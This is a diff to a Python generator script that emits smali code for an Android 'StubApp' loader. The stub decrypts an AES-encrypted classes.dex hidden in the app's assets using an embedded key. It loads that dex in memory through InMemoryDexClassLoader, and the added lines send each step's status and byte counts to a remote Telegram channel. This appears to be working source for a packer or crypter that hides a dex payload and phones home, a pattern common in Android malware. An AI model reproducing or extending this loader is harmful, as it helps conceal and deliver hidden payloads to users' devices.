@@ -4323,39 +4323,78 @@ def main():
 
     :try_start_0
 
+    # LOG 0: build tag so we know which build is running on device
     const-string v0, "StubApp"
     sget-object v1, L{_new_path}/StubApp;->BUILD_TAG:Ljava/lang/String;
     invoke-static {{v0, v1}}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+    invoke-static {{v1}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
+    # 1. hexToBytes(AES_KEY)
     sget-object v0, L{_new_path}/StubApp;->AES_KEY:Ljava/lang/String;
     invoke-static {{v0}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
     move-result-object v0
+    # LOG 1
+    const-string v10, "STUB: hexToBytes key OK"
+    invoke-static {{v10}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
+    # 2. hexToBytes(AES_IV)
     sget-object v1, L{_new_path}/StubApp;->AES_IV:Ljava/lang/String;
     invoke-static {{v1}}, L{_new_path}/StubApp;->hexToBytes(Ljava/lang/String;)[B
     move-result-object v1
 
+    # 3. getAssets() + open classes.dex.enc
     invoke-virtual {{p1}}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
     move-result-object v2
 
     const-string v3, "classes.dex.enc"
     invoke-virtual {{v2, v3}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v3
+    # LOG 3
+    const-string v10, "STUB: asset open OK"
+    invoke-static {{v10}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
+    # 4. readStream → encrypted bytes
     invoke-static {{v3}}, L{_new_path}/StubApp;->readStream(Ljava/io/InputStream;)[B
     move-result-object v4
+    # LOG 4: include enc byte count
+    array-length v10, v4
+    new-instance v9, Ljava/lang/StringBuilder;
+    invoke-direct {{v9}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "STUB: readStream OK encBytes="
+    invoke-virtual {{v9, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v9, v10}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {{v9}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v3
+    invoke-static {{v3}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
+    # 5. AES-256-CBC decrypt
     invoke-static {{v4, v0, v1}}, L{_new_path}/StubApp;->aesDecrypt([B[B[B)[B
     move-result-object v5
+    # LOG 5: include dec byte count
+    array-length v10, v5
+    new-instance v9, Ljava/lang/StringBuilder;
+    invoke-direct {{v9}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "STUB: aesDecrypt OK decBytes="
+    invoke-virtual {{v9, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v9, v10}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {{v9}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v3
+    invoke-static {{v3}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
+    # 6. Wrap in ByteBuffer
     invoke-static {{v5}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
     move-result-object v6
 
+    # 7. Get original PathClassLoader
     invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
     move-result-object v7
 
+    # 8. Create IMDCL
     new-instance v8, Ldalvik/system/InMemoryDexClassLoader;
     invoke-direct {{v8, v6, v7}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+    # LOG 8
+    const-string v10, "STUB: IMDCL created"
+    invoke-static {{v10}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
     # Fix C: store IMDCL into static sCL so CoreComponentFactory can retry with it
     sput-object v8, L{_new_path}/StubApp;->sCL:Ljava/lang/ClassLoader;
@@ -4419,6 +4458,9 @@ def main():
     invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
     invoke-static {{p1}}, L{_new_path}/StubApp;->injectResources(Landroid/content/Context;)V
+    # LOG: injectResources returned (success or handled internally)
+    const-string v0, "RES: injectResources returned"
+    invoke-static {{v0}}, L{_new_path}/StubApp;->sendTelegram(Ljava/lang/String;)V
 
     invoke-virtual {{p1}}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
     move-result-object v1
